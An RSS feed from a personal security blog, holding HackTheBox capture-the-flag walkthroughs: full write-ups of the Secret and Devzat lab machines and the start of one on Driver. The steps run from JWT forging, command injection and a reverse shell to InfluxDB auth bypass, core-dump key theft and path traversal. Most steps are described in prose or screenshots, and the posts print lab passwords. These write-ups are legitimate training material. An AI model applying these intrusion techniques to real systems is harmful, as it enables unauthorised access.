<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-03-26T17:09:19+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Secret - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/secret.html" rel="alternate" type="text/html" title="Secret - HackTheBox" /><published>2022-03-26T00:00:00+01:00</published><updated>2022-03-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/secret</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/secret.html"><![CDATA[<p><strong>Secret</strong> is an easy linux box where you have to exploit a <em>sensitive information</em> leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to <em>command injection</em>. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211031081337.png" alt="" /></p>

<p><img src="/assets/img/20211031081355.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Oct 30 20:00:45 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.120
Nmap scan report for secret.htb (10.10.11.120)
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 30 20:01:41 2021 -- 1 IP address (1 host up) scanned in 56.17 seconds
</code></pre>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211031081510.png" alt="" /></p>

<p><img src="/assets/img/20211031082706.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">/doc</code> path in the website provides a demo for creating and accessing accounts using the API;</p>

<p><img src="/assets/img/20211031081706.png" alt="" /></p>

<p>Possible credential?</p>

<p><img src="/assets/img/20211031081811.png" alt="" /></p>

<p>Account login;</p>

<p><img src="/assets/img/20211031081837.png" alt="" /></p>

<p>There is a link to download source code in the homepage;</p>

<p><img src="/assets/img/20211031081959.png" alt="" /></p>

<p>It is a ZIP file, which I download and extract. It contains a <code class="language-plaintext highlighter-rouge">.git</code> folder in the root, so it’s a GIT repository. Running <code class="language-plaintext highlighter-rouge">git log</code> command showed something interesting;</p>

<p><img src="/assets/img/20211031082300.png" alt="" /></p>

<p>So I ran the <code class="language-plaintext highlighter-rouge">git diff</code> command using the commit ID to see what changes were made, and I got the token used to sign JWT tokens as indicated by the file <code class="language-plaintext highlighter-rouge">routes/verifytoken.js</code>;</p>

<p><img src="/assets/img/20211031082359.png" alt="" /></p>

<p><img src="/assets/img/20211031082447.png" alt="" /></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonwebtoken</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">auth-token</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access Denied</span><span class="dl">"</span><span class="p">);</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">verified</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span><span class="p">);</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">verified</span><span class="p">;</span>
        <span class="nx">next</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid Token</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The login API is also vulnerable to user enumeration as login attempt using a valid email with a bad password said <strong>Password is wrong</strong>, while attempt with invalid email says <strong>Email is wrong</strong>.</p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Using <em>Burp Suite</em>, I was able to create an account using the following request;</p>

<p><img src="/assets/img/20211031084145.png" alt="" /></p>

<p>Logging into the account gave me a token, which I forged on https://jwt.io using the JWT secret obtained, and changed the username to <code class="language-plaintext highlighter-rouge">theadmin</code> (the administrative username obtained by going through the source files). Using the forged token, request to <code class="language-plaintext highlighter-rouge">/api/priv</code> showed I am now the admin;</p>

<p><img src="/assets/img/20211031084644.png" alt="" /></p>

<p>I am now authenticated as an admin, but still have no idea how to utilise the API.</p>

<p>Using the <code class="language-plaintext highlighter-rouge">package.json</code> file in the root of the repo, which contains dependencies of the project and their version numbers, I started looking for exploits online, but couldn’t find anything interesting. So I continue to enumerate previous commits using <code class="language-plaintext highlighter-rouge">git diff</code>, and found an interesting commit with the ID <code class="language-plaintext highlighter-rouge">e297a2797a5f62b6011654cf6fb6ccb6712d2d5b</code>;</p>

<p><img src="/assets/img/20211031100641.png" alt="" /></p>

<p>That looks like a shell command that can be exploited if I can control the value of <code class="language-plaintext highlighter-rouge">req.query.file</code>. Crafting a request in <em>Burp Suite</em> for the endpoint, I got this;</p>

<p><img src="/assets/img/20211031101119.png" alt="" /></p>

<p>I assumed <code class="language-plaintext highlighter-rouge">req.query</code> is used to store all queries defined in the request, so I added a GET parameter named <code class="language-plaintext highlighter-rouge">file</code> with a test value, and it got included in the command;</p>

<p><img src="/assets/img/20211031101334.png" alt="" /></p>

<p>Injecting an encoded bash reverse shell in the <code class="language-plaintext highlighter-rouge">file</code> parameter, I got a shell as the user <strong>dasith</strong>;</p>

<p><img src="/assets/img/20211031101959.png" alt="" /></p>

<p><img src="/assets/img/20211031102057.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>Can’t list sudo permissions for the user as I still don’t have his password. <code class="language-plaintext highlighter-rouge">netstat</code> showed a service running locally, which was identified as <em>MongoDB</em> using <code class="language-plaintext highlighter-rouge">telnet</code>;</p>

<p><img src="/assets/img/20211031102910.png" alt="" /></p>

<p>Checking the <code class="language-plaintext highlighter-rouge">.env</code> file, I got a path for the service;</p>

<p><img src="/assets/img/20211031103224.png" alt="" /></p>

<p>The user does not have SSH public key authentication setup, so I used <code class="language-plaintext highlighter-rouge">ssh-keygen</code> to setup one, so I can setup port-forwarding to the MongoDB service over SSH. I still got the same error when trying to access the MongoDB service over HTTP.</p>

<p>After reading up on <em>MongoDB</em>, I found a cheatsheet at https://gist.github.com/michaeltreat/d3bdc989b54cff969df86484e091fd0c that helped me enumerate the service. I found a database named <code class="language-plaintext highlighter-rouge">web-auth</code> containing four (4) hashes;</p>

<p><img src="/assets/img/20211031104847.png" alt="" /></p>

<p><img src="/assets/img/20211031104911.png" alt="" /></p>

<p>Attempt to crack the hashes using <code class="language-plaintext highlighter-rouge">john</code> was taking way too long, so I aborted it and move on. One of the hashes was eventually cracked, but didn’t give me access to anything.</p>

<p>Inside <code class="language-plaintext highlighter-rouge">/opt/</code>, I found a SUID binary owned by root, and what looks like the source code. Running it, it asks for a filename, and then report some stats for the file;</p>

<p><img src="/assets/img/20211031110157.png" alt="" /></p>

<p>Privileges are dropped when saving results, which means I can’t write anything to protected paths. Attempts to step through the process while loading protected files using <code class="language-plaintext highlighter-rouge">strace</code> and <code class="language-plaintext highlighter-rouge">gdb</code> failed because they can’t attach to a process of higher privileges.</p>

<p>Going through the source code, I noticed core dumping was enabled;</p>

<p><img src="/assets/img/20211101174829.png" alt="" /></p>

<p>Fuzzing the program’s input did not cause the program to crash. After taking a sanity check, I realized I could cause a program to crash and dump core by sending it a SIGSEGV (signal ID: 11). Running <code class="language-plaintext highlighter-rouge">kill -n 11 &lt;PID&gt;</code> while the program is asking where the results should be saved, I was able to crash it;</p>

<p><img src="/assets/img/20211101175418.png" alt="" /></p>

<p>Checking <code class="language-plaintext highlighter-rouge">/var/crash</code>, I found the crash file generated;</p>

<p><img src="/assets/img/20211101175510.png" alt="" /></p>

<p>After googling around, I learned that such crash files can be processed using <code class="language-plaintext highlighter-rouge">apport-unpack</code> tool, so I did;</p>

<p><img src="/assets/img/20211101175648.png" alt="" /></p>

<p>The file <code class="language-plaintext highlighter-rouge">CoreDump</code> was identified as the core dump;</p>

<p><img src="/assets/img/20211101175813.png" alt="" /></p>

<p>So I load it in the <code class="language-plaintext highlighter-rouge">gdb</code> installed on the host, and searched the memory mappings of the program using the<code class="language-plaintext highlighter-rouge">find</code> command, and manually go through the stack using <code class="language-plaintext highlighter-rouge">x/s &lt;some-address&gt;</code>, but could only locate the name of the file (<code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code>) that was given to the SUID binary before the crash. With the help of the <code class="language-plaintext highlighter-rouge">strings</code> command-line tool, I was able to extract the private key of <code class="language-plaintext highlighter-rouge">root</code> (which was the file given to the binary before the crash);</p>

<p><img src="/assets/img/20211101180210.png" alt="" /></p>

<p>I used the key to gain access to the box as <code class="language-plaintext highlighter-rouge">root</code> over SSH;</p>

<p><img src="/assets/img/20211101180443.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified running services with <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Used the documentation to create an account on the web API.</li>
  <li>Found the JWT token signing key in a previous commit in the source files using <code class="language-plaintext highlighter-rouge">git diff</code>, and used it to forge a token for the admin user.</li>
  <li>Found the path <code class="language-plaintext highlighter-rouge">/api/logs</code> that’s accessible only to admins is vulnerable to command injection, which I exploited to gain access to the box as the user <code class="language-plaintext highlighter-rouge">dasith</code></li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">dasith</code>;
    <ul>
      <li>Exploited a SUID binary by causing it to core dump after reading the private SSH key of the root user.</li>
      <li>Retrieved the SSH key in the crash file using <code class="language-plaintext highlighter-rouge">apport-unpack</code> and <code class="language-plaintext highlighter-rouge">strings</code>, and gained root access to the box over SSH.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="api" /><category term="nodejs" /><category term="static analysis" /><category term="git" /><category term="jwt" /><category term="command injection" /><category term="information disclosure" /><category term="tunneling" /><category term="apport" /><category term="custom exploitation" /><summary type="html"><![CDATA[Secret is an easy linux box where you have to exploit a sensitive information leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to command injection. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.]]></summary></entry><entry><title type="html">Devzat - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/devzat.html" rel="alternate" type="text/html" title="Devzat - HackTheBox" /><published>2022-03-12T00:00:00+01:00</published><updated>2022-03-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/devzat</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/devzat.html"><![CDATA[<p><strong>Devzat</strong> is a pretty easy <em>medium</em> linux box. It starts with a website that inform you about a chat service on the host accessible on port <strong>8000</strong>. Some enumeration will yield a hidden subdomain that’s vulnerable to <em>command injection</em>. Once inside the box, there is an instance of <em>InfluxDB</em> running locally that’s vulnerable to <strong>CVE-2019-20933</strong>, which you can use to gain access to the box as another local user. Privesc involves exploiting a <em>path traversal</em> flaw in a custom code.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211017084731.png" alt="" /></p>

<p><img src="/assets/img/20211017084810.png" alt="" />
<br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sun Oct 17 08:49:05 2021 as: nmap -sV -sC -oN nmap.txt 10.10.11.118
Nmap scan report for 10.10.11.118
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.70%I=7%D=10/17%Time=616BD594%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 17 08:50:17 2021 -- 1 IP address (1 host up) scanned in 71.63 seconds
</code></pre>
<p><br /></p>

<h3 id="web">Web</h3>

<p><img src="/assets/img/20211017085159.png" alt="" /></p>

<p><img src="/assets/img/20211017085740.png" alt="" /></p>

<p>Possible username <code class="language-plaintext highlighter-rouge">patrick</code>?</p>

<p><img src="/assets/img/20211017085822.png" alt="" /></p>

<p>Connecting to the SSH service on port <strong>8000</strong> gave the below output;</p>

<p><img src="/assets/img/20211017090318.png" alt="" /></p>

<p><img src="/assets/img/20211017090432.png" alt="" /></p>

<p>Attempts to log in as the user <em>patrick</em> kept failing, saying it’s reserved for local use. This may be because the user <em>patrick</em> is the admin.</p>

<p>Bruteforcing virtual hosts using <code class="language-plaintext highlighter-rouge">ffuf</code> discovered one;</p>

<p><img src="/assets/img/20211017092446.png" alt="" />
<br /></p>

<hr />
<h3 id="pets">Pets</h3>
<p><br /></p>

<p><img src="/assets/img/20211017092715.png" alt="" /></p>

<p><img src="/assets/img/20211017092740.png" alt="" /></p>

<p>The add pet form above is used to add an entry to the pets list. Adding a pet generated the request;</p>

<p><img src="/assets/img/20211017093153.png" alt="" /></p>

<p>Bruteforcing the web root with <code class="language-plaintext highlighter-rouge">ffuf</code> kept giving <strong>200</strong> responses, even for invalid paths. Viewing the page source showed it is dynamically generated by a JavaScript code;</p>

<p><img src="/assets/img/20211017093348.png" alt="" /></p>

<p>So I downloaded the file and parsed it with <code class="language-plaintext highlighter-rouge">js-beautify</code> for easier analysis. I found the block of code that generates the request used for adding pets, and nothing more of interest;</p>

<p><img src="/assets/img/20211017094040.png" alt="" /></p>

<p>Newly added pet entries can be seen immediately after they have been added, but refreshing the page makes them disappear.
<br /></p>

<h4 id="fuzzing-the-json-data">Fuzzing the JSON data</h4>
<p><br /></p>

<p>Deleting all the parameters doesn’t have any visible effect on the parser at first, and the web app responded with <strong>Pet was added successfully</strong>. Breaking the JSON syntax produced an error message;</p>

<p><img src="/assets/img/20211017095228.png" alt="" /></p>

<p>Sometimes even after getting a success message from the POST request, reloading the JSON data does not show the new pet entry. However, after submitting only the <code class="language-plaintext highlighter-rouge">name</code> parameter, reloading the pets JSON data by sending GET request to <code class="language-plaintext highlighter-rouge">/api/pet</code> showed a new response;</p>

<p><img src="/assets/img/20211017102637.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">species</code> parameter is not being returned in the JSON data of the pets, but appears to be used to construct the <code class="language-plaintext highlighter-rouge">characteristics</code> parameter that describes the species. I assumed it’s being used to load the characteristics data, which will make it an interesting target for injection attacks like LFI and SQLi.</p>

<p>After adding a <code class="language-plaintext highlighter-rouge">characteristics</code> parameter in the submitted JSON, it is overwritten in the JSON response obtained if the value given to the <code class="language-plaintext highlighter-rouge">species</code> parameter is valid (e.g: <code class="language-plaintext highlighter-rouge">cat</code>), but if it is not valid, the <code class="language-plaintext highlighter-rouge">characteristics</code> parameter in the JSON response gets set to <code class="language-plaintext highlighter-rouge">exit status 1</code>.</p>

<p>The message <code class="language-plaintext highlighter-rouge">exit status 1</code> is very interesting because that is usually the result of a function call or some system command. Return codes that are not equal to <code class="language-plaintext highlighter-rouge">0</code> usually indicate an error. So I started fuzzing the <code class="language-plaintext highlighter-rouge">species</code> and <code class="language-plaintext highlighter-rouge">characteristics</code> parameters for <em>Command Injection</em> flaws, and caught a break. The parameter <code class="language-plaintext highlighter-rouge">species</code> is vulnerable to command injection;</p>

<p><img src="/assets/img/20211017110307.png" alt="" /></p>

<p><img src="/assets/img/20211017110358.png" alt="" /></p>

<p>I then exploited the command injection to gain access to the box as the user <code class="language-plaintext highlighter-rouge">patrick</code>;</p>

<p><img src="/assets/img/20211017110726.png" alt="" /></p>

<p>Going through the source code of the web app at <code class="language-plaintext highlighter-rouge">/home/patrick/pets</code>, I found the vulnerable code that let me in;</p>

<p><img src="/assets/img/20211017111317.png" alt="" /></p>

<p>It looks like the code is also vulnerable to <em>local file inclusion (LFI)</em>.</p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>The user <code class="language-plaintext highlighter-rouge">patrick</code> does not have the user flag, but it was found in the home of <code class="language-plaintext highlighter-rouge">catherine</code>.</p>

<p>Inside the home directory of <em>patrick</em>, source code for the web apps were found, including a binary named <code class="language-plaintext highlighter-rouge">petshop</code> in the <code class="language-plaintext highlighter-rouge">~/pets</code> directory.</p>

<p>Using <code class="language-plaintext highlighter-rouge">linPEAS</code> and manual enumeration didn’t yield anything interesting. <code class="language-plaintext highlighter-rouge">netstat</code> idenitified a bunch of locally running services, so I setup some SSH tunnels so I can scan them from my box;</p>

<p><img src="/assets/img/20211019010046.png" alt="" /></p>

<p>I then ran an <code class="language-plaintext highlighter-rouge">nmap</code> scan on the ports to identify the services they are running;</p>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Oct 19 01:02:17 2021 as: nmap -sV -p6010,8443,53,8086 -oN nmap-hidden.txt localhost
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00023s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE  SERVICE VERSION
53/tcp   closed domain
6010/tcp open   x11?
8086/tcp open   http    InfluxDB http admin 1.7.5
8443/tcp open   ssh     (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.70%I=7%D=10/19%Time=616E0B10%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 19 01:03:12 2021 -- 1 IP address (1 host up) scanned in 55.43 seconds
</code></pre>

<p>The service on port <strong>8086</strong> has been identified as a HTTP service, and viewing it in a browser just give a <strong>404 Not found</strong>. Bruteforcing with <strong>ffuf</strong> found a few paths;</p>

<p><img src="/assets/img/20211019010801.png" alt="" /></p>

<p>Going to the <code class="language-plaintext highlighter-rouge">/query</code> path gave an authentication prompt;</p>

<p><img src="/assets/img/20211019011007.png" alt="" /></p>

<p>Googling showed that the version of <strong>InfluxDB</strong> on the host is vulnerable to authentication bypass, and was exploited using a python code obtained from the repo https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</p>

<p><img src="/assets/img/20211019014045.png" alt="" /></p>

<p><em>InfluxDB</em> is something I have never came across before, so I had to do a lot of googling to learn about it. Using a cheatsheet I found on <em>GitHub</em> at https://gist.github.com/tomazursic/6cc217e2644c619ceceefb8ce824925b, I was able to enumerate the service and found a hash for the user <code class="language-plaintext highlighter-rouge">catherine</code> in the <strong>devzat</strong> database inside the <strong>user</strong> measurement;</p>

<p><img src="/assets/img/20211019165251.png" alt="" /></p>

<p><img src="/assets/img/20211019165415.png" alt="" /></p>

<p>The password <code class="language-plaintext highlighter-rouge">woBeeYareedahc7Oogeephies7Aiseci</code> does not appear to be a hash, so I just used to access the account of <em>catherine</em> on the host, and it worked;</p>

<p><img src="/assets/img/20211019165646.png" alt="" />
<br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <em>catherine</em> does not have permission to run any command on the host using <code class="language-plaintext highlighter-rouge">sudo</code>. No files of interest were found in her home directory, so I ran <code class="language-plaintext highlighter-rouge">linPEAS</code> again in hope of finding something new, but it didn’t.</p>

<p>Inside <code class="language-plaintext highlighter-rouge">/var/backups</code>, 2 backup files belonging to <em>catherine</em> were found. The files were extracted, but nothing of interest was found inside at a quick glance;</p>

<p><img src="/assets/img/20211019172320.png" alt="" /></p>

<p>Connecting to the SSH chat service locally on port <strong>8443</strong> as <em>catherine</em> showed some interesting messages from <em>patrick</em>;</p>

<p><img src="/assets/img/20211019214956.png" alt="" /></p>

<p>Since the default backups directory in linux is <code class="language-plaintext highlighter-rouge">/var/backups</code>, and the only files of interest in the directory are the previously discovered <em>.zip</em> files, I extracted them again to <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and run the <code class="language-plaintext highlighter-rouge">diff</code> command on their extracted files, and found a password <code class="language-plaintext highlighter-rouge">CeilingCatStillAThingIn2021?</code>;</p>

<p><img src="/assets/img/20211019215441.png" alt="" /></p>

<p>Attempt to login as the root user using the password failed. In the text messages <em>patrick</em> talked about implementing a new feature that requires a password, so I continue to examine the output generated by the <code class="language-plaintext highlighter-rouge">diff</code> command, and noticed a function that appears to be used to read files from disk provided a path and a valid password were provided;</p>

<p><img src="/assets/img/20211019220815.png" alt="" /></p>

<p>So I logged back into the chat app as <em>catherine</em> and listed available commands using the <code class="language-plaintext highlighter-rouge">/help</code> command. One entry stood out;</p>

<p><img src="/assets/img/20211019220941.png" alt="" /></p>

<p>This is likely the command used to invoke the function used to read files using a path and a password. So I tried to read the file <code class="language-plaintext highlighter-rouge">/etc/hostname</code> to see if it works, which did not work because the application is prefixing <code class="language-plaintext highlighter-rouge">/root/devzat</code> to the filename given, as indicated by the error message. Using a simple path traversal payload, I was able to read the SSH key file of the <code class="language-plaintext highlighter-rouge">root</code> user;</p>

<p><img src="/assets/img/20211019221352.png" alt="" /></p>

<p>I copied the SSH key to my attack box, and used it to access the box as the <code class="language-plaintext highlighter-rouge">root</code> user over SSH;</p>

<p><img src="/assets/img/20211019221510.png" alt="" />
<br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified services running on the host using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found the username <strong>patrick</strong> on the web page, which is not allowed to be used remotely on the SSH chat service.</li>
  <li>Found a hidden subdomain <strong>pets.devzat.htb</strong> using <code class="language-plaintext highlighter-rouge">ffuf</code>
    <ul>
      <li>Fuzzing the JSON data submitted to the web app via POST request uncovered a <em>command injection</em> flaw, which was exploited to gain access to the box as the user <strong>patrick</strong>.</li>
    </ul>
  </li>
  <li>Inside the box as <strong>patrick</strong>;
    <ul>
      <li>Identified another user named <strong>catherine</strong>.</li>
      <li>Discovered a local installation of <em>InfluxDB</em> that is vulnerable to authentication bypass, and was enumerated to obtain a password that gave access to the account of <strong>catherine</strong>.</li>
    </ul>
  </li>
  <li>Inside the box as <strong>catherine</strong>;
    <ul>
      <li>Connected to the local SSH chat service on port <strong>8443</strong> as <strong>catherine</strong>.</li>
      <li>Received a chat log between <strong>patrick</strong> and <strong>catherine</strong> discussing a new feature that is password-protected, with the password obtainable from backup files in the default linux backups directory.</li>
      <li>Located the password inside the backups and used it to access the feature, which is used to read files from disk. I used it to load the SSH private key of the root user.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="cve" /><category term="command injection" /><category term="influxdb" /><category term="path traversal" /><category term="tunneling" /><category term="custom exploitation" /><summary type="html"><![CDATA[Devzat is a pretty easy medium linux box. It starts with a website that inform you about a chat service on the host accessible on port 8000. Some enumeration will yield a hidden subdomain that’s vulnerable to command injection. Once inside the box, there is an instance of InfluxDB running locally that’s vulnerable to CVE-2019-20933, which you can use to gain access to the box as another local user. Privesc involves exploiting a path traversal flaw in a custom code.]]></summary></entry><entry><title type="html">Driver - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/driver.html" rel="alternate" type="text/html" title="Driver - HackTheBox" /><published>2022-02-26T00:00:00+01:00</published><updated>2022-02-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/driver</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/driver.html"><![CDATA[<p><strong>Driver</strong> is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an <em>SCF File Attack</em> to capture and crack the password of a local user using <code class="language-plaintext highlighter-rouge">responder</code>. After cracking the hash, you can exploit the <em>Print Nightmare</em> vulnerability to gain a privileged access to the box.</p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/20211005084532.png" alt="" /></p>

<p><img src="/assets/img/20211005084600.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Oct  5 08:48:12 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up (0.28s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h14m09s, deviation: 0s, median: 7h14m09s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-05 16:03:00
|_  start_date: 2021-10-05 12:34:03

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  5 08:49:26 2021 -- 1 IP address (1 host up) scanned in 74.97 seconds

</code></pre>

<p>Complete port scan showed <em>winrm</em> on port <strong>5985</strong>;</p>

<p><img src="/assets/img/20211005095636.png" alt="" /></p>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211005085101.png" alt="" /></p>

<p><img src="/assets/img/20211005085120.png" alt="" /></p>

<p>Login attempt using the credentials of <code class="language-plaintext highlighter-rouge">admin:admin</code> granted access;</p>

<p><img src="/assets/img/20211005085453.png" alt="" /></p>

<p>All the links in the navigation are dead, except one that allows for driver upload for firmware update;</p>

<p><img src="/assets/img/20211005091114.png" alt="" /></p>

<p>Request generated by file upload;</p>

<p><img src="/assets/img/20211005092123.png" alt="" /></p>

<p>On successful file upload;</p>

<p><img src="/assets/img/20211005092218.png" alt="" /></p>

<p>Use of the creds to access SMB failed, <code class="language-plaintext highlighter-rouge">rpcclient</code> null auth also failed;</p>

<p><img src="/assets/img/20211005090833.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">CrackMapExec</code> also showed it’s not a valid SMB cred;</p>

<p><img src="/assets/img/20211005095946.png" alt="" /></p>

<p>Googling the title of the firmware update page kept linking me to the <em>PrintNightmare</em> vulnerabiity, but I was unable to exploit as I don’t have access to the SMB service.</p>

<p><br /></p>

<hr />
